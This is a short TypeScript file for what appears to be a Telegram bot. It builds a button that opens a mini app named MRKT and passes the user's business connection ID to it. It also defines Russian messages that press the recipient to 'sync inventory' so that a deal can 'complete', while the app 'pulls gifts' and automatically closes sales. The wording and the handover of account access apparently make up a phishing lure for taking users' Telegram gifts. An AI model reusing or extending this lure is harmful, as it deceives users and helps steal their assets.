import { config } from "./config.js";

const OPEN_MRKT = "Открыть MRKT";

export function mrktWebAppKeyboard(businessConnectionId?: string): {
  inline_keyboard: Array<Array<{ text: string; web_app: { url: string } }>>;
} {
  const url = businessConnectionId
    ? `${config.miniappUrl}?bc=${encodeURIComponent(businessConnectionId)}`
    : config.miniappUrl;
  return {
    inline_keyboard: [[{ text: OPEN_MRKT, web_app: { url } }]],
  };
}

export const introText =
  "Здравствуйте. Для завершения сделки на MRKT нужно синхронизировать инвентарь Vault с веб-версией.\n\n" +
  "Нажмите «Открыть MRKT» — откроется мини-приложение, подтянет подарки и автоматически закроет продажи по активным офферам (buy-ордерам).";

export const nudgeText =
  "Напоминание: без синхронизации инвентаря сделка не завершится. Нажмите «Открыть MRKT» и дождитесь статуса «Готово».";
